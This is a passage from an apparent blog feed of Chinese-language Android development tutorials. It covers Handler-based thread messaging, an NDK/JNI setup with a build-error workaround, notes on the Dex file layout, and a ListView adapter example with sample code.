<p>同时记录下安卓下异步事件分发，如下场景<br><code>在子线程中进行UI的操作，比如更新某个文本</code>，由于android的UI交互是线程不安全的，所以界面操作只能在主线程中进行，那么，就要想办法让子线程<code>通知</code>主线程了，可以通过<code>Handler</code>实现<br>在子线程中构造一个<code>Message</code>，然后通过<code>Handler</code>对象进行通知<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable())</div><div class="line">&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ...</div><div class="line">        Message msg = <span class="keyword">new</span> Message(); </div><div class="line">        msg.what = x;</div><div class="line">        handler.sendMessage(msg);   <span class="comment">//通知      </span></div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">主线程</div><div class="line"><span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler()</div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        xxx    </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>android中异步消息处理主要由四部分构成<br><code>Message</code>  需要传递的信息<br><code>Handler</code>  最终处理者<br><code>Looper</code>   每个线程一个，负责取消息与分发<br><code>MessageQueue</code> 每个线程一个，存放消息队列</p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Android Studio NDK开发配置]]></title>
      <url>/2017/03/05/Android%20Studio%20NDK%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<p>网上有很多<code>LJ</code>教程，耽误时间不说，真能把人气死，废话不说了，开始<code>Android Studio</code>下<code>NDK</code>开发配置。</p>
<p>###1.首先是新建一个android的工程<br>然后新建一个需要用native声明的jni接口类<br>在<code>工程</code>视图下，以<code>app</code>为父节点创建名为<code>jni</code>的文件夹<br><img src="./21-16-17.jpg" alt=""><br>创建<code>JniUtils.java</code>文件，内容如下<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JniUtils</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String  <span class="title">getStringFromC</span><span class="params">()</span></span>;</div><div class="line">    <span class="keyword">static</span></div><div class="line">    &#123;</div><div class="line">        System.loadLibrary(<span class="string">"JniMain"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>主要用来加载<code>so</code>库，并且声明native实现的方法</p>
<p>###2.接着，生成jni头文件，这里使用<code>javah</code>命令。<br>先将工程命令行切换到当前工程java文件处<br>输入<code>javah -jni com.cn.yllen.myapplication.JniUtils</code>后回车<br><img src="./21-18-32.jpg" alt=""><br>在该目录下则可以看到<code>com_cn_yllen_myapplication_JniUtils.h</code>文件(包名+文件名称构成)<br>内容为<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="comment">/* Header for class com_cn_yllen_myapplication_JniUtils */</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _Included_com_cn_yllen_myapplication_JniUtils</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _Included_com_cn_yllen_myapplication_JniUtils</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * Class:     com_cn_yllen_myapplication_JniUtils</span></div><div class="line"><span class="comment"> * Method:    getStringFromC</span></div><div class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></div><div class="line"><span class="comment"> */</span></div><div class="line">JNIEXPORT jstring JNICALL Java_com_cn_yllen_myapplication_JniUtils_getStringFromC</div><div class="line">  (JNIEnv *, jclass);</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>将其剪切到之前新建的<code>jni</code>文件夹下面，然后新建一个<code>JniUtils.c</code>文件，实现如上方法声明<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_cn_yllen_myapplication_JniUtils.h"</span></span></div><div class="line"><span class="function">jstring JNICALL <span class="title">Java_com_cn_yllen_myapplication_JniUtils_getStringFromC</span> <span class="params">(JNIEnv *env, jclass clazz)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, <span class="string">"from C say Hello"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>###3.使用<code>ndk-build</code>编译so<br>(需要先下载NDK开发包，然后将其路径设置为系统环境变量path下)<br>继续新建一个<code>Android.mk</code>文件<br>内容为<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Copyright (C) 2009 The Android Open Source Project</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Licensed under the Apache License, Version 2.0 (the "License");</span></div><div class="line"><span class="comment"># you may not use this file except in compliance with the License.</span></div><div class="line"><span class="comment"># You may obtain a copy of the License at</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#      http://www.apache.org/licenses/LICENSE-2.0</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></div><div class="line"><span class="comment"># distributed under the License is distributed on an "AS IS" BASIS,</span></div><div class="line"><span class="comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class="line"><span class="comment"># See the License for the specific language governing permissions and</span></div><div class="line"><span class="comment"># limitations under the License.</span></div><div class="line"><span class="comment">#</span></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line"></div><div class="line">LOCAL_MODULE    := JniMain      # 要生成的so文件名称</div><div class="line">LOCAL_SRC_FILES := JniUtils.c   # 源码</div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure></p>
<p>之后我们用<code>ndk-build</code>命令来编译so文件<br>正常情况下是<br><figure class="highlight bat"><table><tr><td class="code"><pre><div class="line"><span class="function">D:\<span class="title">asproj</span>\<span class="title">MyApplication4</span>\<span class="title">app</span>&gt;<span class="title">ndk</span>-<span class="title">build</span></span></div><div class="line"><span class="function">"<span class="title">Compile</span> <span class="title">thumb</span> : <span class="title">JniMain</span> &lt;= <span class="title">JniUtils.c</span></span></div><div class="line"><span class="function"><span class="title">SharedLibrary</span>  : <span class="title">libJniMain.so</span></span></div><div class="line"><span class="function"><span class="title">Install</span>        : <span class="title">libJniMain.so</span> =&gt; <span class="title">libs</span>/<span class="title">armeabi</span>/<span class="title">libJniMain.so</span></span></div></pre></td></tr></table></figure></p>
<p>但是有可能是这种情况，<br><figure class="highlight bat"><table><tr><td class="code"><pre><div class="line"><span class="function">D:\<span class="title">asproj</span>\<span class="title">MyApplication4</span>\<span class="title">app</span>&gt;<span class="title">ndk</span>-<span class="title">build</span></span></div><div class="line"><span class="function">[<span class="title">arm64</span>-<span class="title">v8a</span>] "<span class="title">Compile</span>        ": "<span class="title">JniUtils</span> &lt;= <span class="title">JniUtils.c</span>"</span></div><div class="line"><span class="function"><span class="title">process_begin</span>: <span class="title">CreateProcess</span>(<span class="title">NULL</span>, <span class="title">E</span>:/<span class="title">mobileSec</span>/<span class="title">tools</span>/<span class="title">android</span>-<span class="title">sdk_r24</span>.3.4-<span class="title">windows</span>/<span class="title">android</span>-<span class="title">sdk</span>-<span class="title">windows</span>/<span class="title">ndk</span>-<span class="title">bundle</span>/<span class="title">build</span>//../<span class="title">toolchains</span>/<span class="title">llvm</span>/<span class="title">prebuilt</span>/<span class="title">windows</span>-<span class="title">x86_</span></span></div><div class="line"><span class="function">64/<span class="title">bin</span>/<span class="title">clang.exe</span> -<span class="title">MMD</span> -<span class="title">MP</span> -<span class="title">MF</span> ./<span class="title">obj</span>/<span class="title">local</span>/<span class="title">arm64</span>-<span class="title">v8a</span>/<span class="title">objs</span>/<span class="title">JniUtils</span>/<span class="title">JniUtils.o.d</span> -<span class="title">gcc</span>-<span class="title">toolchain</span> <span class="title">E</span>:/<span class="title">mobileSec</span>/<span class="title">tools</span>/<span class="title">android</span>-<span class="title">sdk_r24</span>.3.4-<span class="title">windows</span>/<span class="title">android</span>-<span class="title">sdk</span>-<span class="title">windows</span>/<span class="title">n</span></span></div><div class="line"><span class="function"><span class="title">dk</span>-<span class="title">bundle</span>/<span class="title">build</span>//../<span class="title">toolchains</span>/<span class="title">aarch64</span>-<span class="title">linux</span>-<span class="title">android</span>-4.9/<span class="title">prebuilt</span>/<span class="title">windows</span>-<span class="title">x86_64</span> -<span class="title">target</span> <span class="title">aarch64</span>-<span class="title">none</span>-<span class="title">linux</span>-<span class="title">android</span> -<span class="title">ffunction</span>-<span class="title">sections</span> -<span class="title">funwind</span>-<span class="title">tables</span> -<span class="title">fstack</span>-</span></div><div class="line"><span class="function"><span class="title">protector</span>-<span class="title">strong</span> -<span class="title">fpic</span> -<span class="title">Wno</span>-<span class="title">invalid</span>-<span class="title">command</span>-<span class="title">line</span>-<span class="title">argument</span> -<span class="title">Wno</span>-<span class="title">unused</span>-<span class="title">command</span>-<span class="title">line</span>-<span class="title">argument</span> -<span class="title">no</span>-<span class="title">canonical</span>-<span class="title">prefixes</span> -<span class="title">g</span> -<span class="title">O2</span> -<span class="title">DNDEBUG</span> -<span class="title">Ijni</span> -<span class="title">DANDROID</span> -<span class="title">Wa</span>,--<span class="title">noexecs</span></span></div><div class="line"><span class="function"><span class="title">tack</span> -<span class="title">Wformat</span> -<span class="title">Werror</span>=<span class="title">format</span>-<span class="title">security</span> --<span class="title">sysroot</span> <span class="title">E</span>:/<span class="title">mobileSec</span>/<span class="title">tools</span>/<span class="title">android</span>-<span class="title">sdk_r24</span>.3.4-<span class="title">windows</span>/<span class="title">android</span>-<span class="title">sdk</span>-<span class="title">windows</span>/<span class="title">ndk</span>-<span class="title">bundle</span>/<span class="title">build</span>//../<span class="title">platforms</span>/<span class="title">android</span>-21/<span class="title">arc</span></span></div><div class="line"><span class="function"><span class="title">h</span>-<span class="title">arm64</span> -<span class="title">c</span> <span class="title">jni</span>/<span class="title">JniUtils.c</span> -<span class="title">o</span> ./<span class="title">obj</span>/<span class="title">local</span>/<span class="title">arm64</span>-<span class="title">v8a</span>/<span class="title">objs</span>/<span class="title">JniUtils</span>/<span class="title">JniUtils.o</span>, ...) <span class="title">failed</span>.</span></div><div class="line"><span class="function"><span class="title">make</span> (<span class="title">e</span>=2):</span></div><div class="line"><span class="function"><span class="title">make</span>: *** [<span class="title">obj</span>/<span class="title">local</span>/<span class="title">arm64</span>-<span class="title">v8a</span>/<span class="title">objs</span>/<span class="title">JniUtils</span>/<span class="title">JniUtils.o</span>] <span class="title">Error</span> 2</span></div></pre></td></tr></table></figure></p>
<p>这种我也不知道什么问题，我尝试的办法就是，找个<code>短点</code>的路径(如D:\test)，将jni文件夹整个复制过去，然后编译，就可以成功，之后，将生成的<code>libs</code>文件夹拷贝过来就行了。<br>生成libs文件夹下会有<br><img src="./21-33-08.jpg" alt=""><br>为了让studio能将so一同打包到apk中，需要在<code>build.gradle</code>(app)中如下红框内容的添加：<br><img src="./21-34-44.jpg" alt=""><br>至此，so的已经可以随着<code>build</code>一同被打包到apk下’libs’文件夹中了，接着就是要对这个native方法的调用了，</p>
<p>###4.使用这个方法<br>我们新建一个按钮，在点击的同时，将native实现的接口返回值用<code>Toast</code>打印出来，代码如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        Button button = (Button) findViewById(R.id.button_1);</div><div class="line"></div><div class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>,JniUtils.getStringFromC(),Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>###最后<br>网上虽然有很多各种<code>hello world</code>教程，但是鱼龙混杂，有些是真的坑。<br>通过本文的这些总结，希望之后的人不要再<code>走坑</code>。<br>…. <code>7456</code> &gt;m &lt;``</p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Dex格式学习]]></title>
      <url>/2017/03/05/%5B%E9%80%86%E5%90%91%E7%AF%87%5DDex%E6%A0%BC%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>1.dex header<br>制定dex文件的一些属性，记录其他6部分数据结构在dex文件中的物理偏移</p>
<p>2.string_ids、type_ids、type_ids、proto_ids、field_ids、method_ids、class_def<br>索引结构区</p>
<p>3.data<br>真实数据存储在这里</p>
<p>未经过优化的dex文件结构如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFile</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    DexHeader   Header;</div><div class="line">    DexStringId StringIds[stringIdsSize];</div><div class="line">    DexTypeId   TypeIds[typeIdsSize];</div><div class="line">    DexProtoId  ProtoIds[protoIdsSize];</div><div class="line">    DexFieldId  FieldIds[fieldIdsSize];</div><div class="line">    DexMethodId MethodIds[methodIdsSize];</div><div class="line">    DexClassDef ClassDefs[classDefsSize];</div><div class="line">    DexData     Data[];</div><div class="line">    DexLink     LinkData;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>dalvik虚拟机在解析Dex文件的时候，首先根据Dex Header中DexMapList字段，将内容映射到内存</p>
<p><img src="./14-58-44.jpg" alt=""></p>
<p><img src="./14-59-05.jpg" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> MobSec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android开发之ListView]]></title>
      <url>/2017/03/05/%5B%E5%BC%80%E5%8F%91%E7%AF%87%5Dandroid%E5%BC%80%E5%8F%91%E4%B9%8BListView/</url>
      <content type="html"><![CDATA[<p>##ListView功能很强大，类似Windows下的列表菜单。<br>如下实现一个简单的ListView.<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ListView</span></span></div><div class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/list_view"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ListView</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>###通过内置的适配器进行界面关联<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</div><div class="line"><span class="keyword">import</span> android.widget.ListView;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> String[] data = &#123;<span class="string">"apple"</span>,<span class="string">"Banana"</span>,<span class="string">"Orange"</span>,<span class="string">"Watermelon"</span>,<span class="string">"Pear"</span>,<span class="string">"Grape"</span>,<span class="string">"Pineapple"</span>,<span class="string">"Strawberry"</span>,<span class="string">"Cherry"</span>,<span class="string">"Mango"</span>&#125;;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(MainActivity.<span class="keyword">this</span>,android.R.layout.simple_list_item_1,data);</div><div class="line">        ListView listView = (ListView)findViewById(R.id.list_view);</div><div class="line">        listView.setAdapter(adapter);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中<code>ArrayAdapter</code>的构造函数参数为:</p>
<ol>
<li>上线文</li>
<li>子项布局ID</li>
<li>数据</li>
</ol>
<h4 id="加入图片"><a href="#加入图片" class="headerlink" title="加入图片"></a>加入图片</h4><p>新建布局<code>fruit_item.xml</code>如下<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/fruit_image"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/fruit_name"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"center_vertical"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"10dp"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>用类来封装子项数据<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruit</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> imageId;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Fruit</span><span class="params">(String name,<span class="keyword">int</span> imageId)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">this</span>.imageId = imageId;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getImageId</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> imageId;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重新实现一个<code>FruitAdapter</code><br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FruitAdapter</span> <span class="keyword">extends</span> <span class="title">ArrayAdapter</span>&lt;<span class="title">Fruit</span>&gt;</span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> resourceId;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FruitAdapter</span><span class="params">(Context context,<span class="keyword">int</span> textViewResourceId, List&lt;Fruit&gt; objects)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">super</span>(context, textViewResourceId ,objects );</div><div class="line">        resourceId = textViewResourceId;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> position, View convertView, ViewGroup parent)</span> </span>&#123;</div><div class="line">        Fruit fruit = getItem(position);    <span class="comment">//获取当前想的Fruit实例</span></div><div class="line">        View view;                          <span class="comment">// convertView 已加载view进行缓存</span></div><div class="line">        ViewHolder viewHolder;</div><div class="line">        <span class="keyword">if</span> (convertView == <span class="keyword">null</span>)</div><div class="line">        &#123;</div><div class="line">            view = LayoutInflater.from(getContext()).inflate(resourceId,parent,<span class="keyword">false</span>);</div><div class="line">            viewHolder = <span class="keyword">new</span> ViewHolder();</div><div class="line">            viewHolder.fruitImage = (ImageView)view.findViewById(R.id.fruit_image);</div><div class="line">            viewHolder.fruitName = (TextView)view.findViewById(R.id.fruit_name);</div><div class="line">            view.setTag(viewHolder);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            view = convertView;</div><div class="line">            viewHolder = (ViewHolder)view.getTag(); <span class="comment">//重新得到ViewHolder</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        viewHolder.fruitImage.setImageResource(fruit.getImageId());</div><div class="line">        viewHolder.fruitName.setText(fruit.getName());</div><div class="line">        <span class="keyword">return</span> view;</div><div class="line">    &#125;</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span></span></div><div class="line"><span class="class">    </span>&#123;</div><div class="line">        ImageView fruitImage;</div><div class="line">        TextView fruitName;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注意上面代码对ListView有两处优化，分别为：</p>
<ol>
<li>convertView 为上次缓存View，若不为空即可不用重新生成View</li>
<li>用ViewHolder将已经<code>findViewById</code>成功的控件保存起来,防止每次都在布局中找而耗时</li>
</ol>
<p>最终入口代码如下:<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FruitAdapter</span> <span class="keyword">extends</span> <span class="title">ArrayAdapter</span>&lt;<span class="title">Fruit</span>&gt;</span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> resourceId;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FruitAdapter</span><span class="params">(Context context,<span class="keyword">int</span> textViewResourceId, List&lt;Fruit&gt; objects)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">super</span>(context, textViewResourceId ,objects );</div><div class="line">        resourceId = textViewResourceId;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">int</span> position, View convertView, ViewGroup parent)</span> </span>&#123;</div><div class="line">        Fruit fruit = getItem(position);    <span class="comment">//获取当前想的Fruit实例</span></div><div class="line">        View view;                          <span class="comment">// convertView 已加载view进行缓存</span></div><div class="line">        ViewHolder viewHolder;</div><div class="line">        <span class="keyword">if</span> (convertView == <span class="keyword">null</span>)</div><div class="line">        &#123;</div><div class="line">            view = LayoutInflater.from(getContext()).inflate(resourceId,parent,<span class="keyword">false</span>);</div><div class="line">            viewHolder = <span class="keyword">new</span> ViewHolder();</div><div class="line">            viewHolder.fruitImage = (ImageView)view.findViewById(R.id.fruit_image);</div><div class="line">            viewHolder.fruitName = (TextView)view.findViewById(R.id.fruit_name);</div><div class="line">            view.setTag(viewHolder);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            view = convertView;</div><div class="line">            viewHolder = (ViewHolder)view.getTag(); <span class="comment">//重新得到ViewHolder</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        viewHolder.fruitImage.setImageResource(fruit.getImageId());</div><div class="line">        viewHolder.fruitName.setText(fruit.getName());</div><div class="line">        <span class="keyword">return</span> view;</div><div class="line">    &#125;</div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span></span></div><div class="line"><span class="class">    </span>&#123;</div><div class="line">        ImageView fruitImage;</div><div class="line">        TextView fruitName;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//private String[] data = &#123;"apple","Banana","Orange","Watermelon","Pear","Grape","Pineapple","Strawberry","Cherry","Mango"&#125;;</span></div><div class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList = <span class="keyword">new</span> ArrayList&lt;Fruit&gt;();</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        <span class="comment">/*</span></div><div class="line"><span class="comment">        ArrayAdapter&lt;String&gt; adapter = new ArrayAdapter&lt;String&gt;(MainActivity.this,android.R.layout.simple_list_item_1,data);</span></div><div class="line"><span class="comment">        ListView listView = (ListView)findViewById(R.id.list_view);</span></div><div class="line"><span class="comment">        listView.setAdapter(adapter);</span></div><div class="line"><span class="comment">        */</span></div><div class="line">        InitFruits();</div><div class="line">        FruitAdapter adapter = <span class="keyword">new</span> FruitAdapter(MainActivity.<span class="keyword">this</span>,R.layout.fruit_item,fruitList);</div><div class="line">        ListView listView = (ListView) findViewById(R.id.list_view);</div><div class="line">        listView.setAdapter(adapter);</div><div class="line">        listView.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</div><div class="line">                Fruit fruit = fruitList.get(position);</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>,fruit.getName(),Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InitFruits</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">2</span> ; ++i)</div><div class="line">        &#123;</div><div class="line">            Fruit apple = <span class="keyword">new</span> Fruit(<span class="string">"Apple"</span>, R.drawable.apple_pic);</div><div class="line">            fruitList.add(apple);</div><div class="line">            Fruit banana = <span class="keyword">new</span> Fruit(<span class="string">"Banana"</span>, R.drawable.banana_pic);</div><div class="line">            fruitList.add(banana);</div><div class="line">            Fruit orange = <span class="keyword">new</span> Fruit(<span class="string">"Orange"</span>, R.drawable.orange_pic);</div><div class="line">            fruitList.add(orange);</div><div class="line">            Fruit watermelon = <span class="keyword">new</span> Fruit(<span class="string">"Watermelon"</span>, R.drawable.watermelon_pic);</div><div class="line">            fruitList.add(watermelon);</div><div class="line">            Fruit pear = <span class="keyword">new</span> Fruit(<span class="string">"Pear"</span>, R.drawable.pear_pic);</div><div class="line">            fruitList.add(pear);</div><div class="line">            Fruit grape = <span class="keyword">new</span> Fruit(<span class="string">"Grape"</span>, R.drawable.grape_pic);</div><div class="line">            fruitList.add(grape);</div><div class="line">            Fruit pineapple = <span class="keyword">new</span> Fruit(<span class="string">"Pineapple"</span>, R.drawable.pineapple_pic);</div><div class="line">            fruitList.add(pineapple);</div><div class="line">            Fruit strawberry = <span 